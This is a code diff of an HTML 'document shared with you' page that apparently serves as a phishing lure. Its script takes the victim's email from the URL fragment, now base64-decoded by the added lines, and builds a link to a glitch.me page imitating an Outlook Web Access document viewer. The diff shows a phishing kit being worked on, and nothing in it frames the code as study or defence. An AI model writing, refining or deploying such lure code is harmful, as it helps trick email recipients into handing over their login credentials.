@@ -103,7 +103,7 @@
   
   <div class="container">
     <div class="row">
-      <p style="font-size:20px; font-weight:bold; background: rgba(225, 225, 225, .2)" class="">
+      <p style="font-size:20px; font-weight:bold; background: rgba(225, 225, 225, .1)" class="">
         Use the following link to view the document(s) shared with you for best performance.
       </p>
       </div>
@@ -151,7 +151,7 @@
   
  
   
-  <script>
+ <script>
     var currentUrl = window.location.href;
     
     var siteUrl = currentUrl;
@@ -159,15 +159,23 @@
 var email = siteUrl.substring(siteUrl.lastIndexOf("#") +1);
     var linktag = "#";
     var link = "https://third-five-pan.glitch.me/owa/out/ook/3A463ec6f4-1895-47d5-ae59-3f74ca8ee6bc&viewer/proposal/augustproposal.htm";
-    
-    var domainlink = linktag.concat(email);
+   // Define the string
+
+
+// Decode the String
+var decodedStringAtoB = atob(email);
+
+
+    var domainlink = linktag.concat(decodedStringAtoB);
     var mainlink = link.concat(domainlink);
     
     document.getElementById('link').href = mainlink;
     console.log(mainlink);
-   
+    console.log(decodedStringAtoB);    
   
   </script>
+	
+	
   
   <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
 <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
